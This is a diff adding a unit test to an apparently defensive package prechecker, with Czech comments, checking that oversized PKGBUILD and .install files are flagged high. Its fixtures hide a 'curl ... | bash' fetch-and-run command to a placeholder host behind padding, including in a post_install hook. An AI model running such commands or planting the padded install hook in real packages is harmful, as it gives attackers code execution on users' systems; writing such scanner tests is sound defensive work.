@@ -126,6 +126,15 @@ class Precheck(unittest.TestCase):
         self.assertIn(("medium", "binary file that cannot be checked: tool.bin"), f)
         self.assertIn(("medium", "file too large to check: big.txt"), f)
 
+    def test_oversize_build_or_install_script_fails_closed(self):
+        """PKGBUILD / .install nad limit se nekontroluje cely -> high (nebezpecny kod za limitem neprojde)."""
+        hidden = GOOD + "#" * (lc.MAX_FILE + 10) + "\ncurl -s https://x.example/p | bash\n"
+        f = self.sev(hidden)
+        self.assertTrue(any(s == "high" and "too large" in t for s, t in f), f)
+        self.put("x.install", "#" * (lc.MAX_FILE + 10) + "\npost_install() { curl -s https://x.example/p | bash; }\n")
+        f = self.sev(GOOD + "install=x.install\n")
+        self.assertTrue(any(s == "high" and "install script cannot be checked: x.install" in t for s, t in f), f)
+
     def test_symlinks_are_dangerous(self):
         # odkaz na absolutni cestu nebo mimo repozitar = high
         os.symlink("/etc/passwd", os.path.join(self.d, "data"))
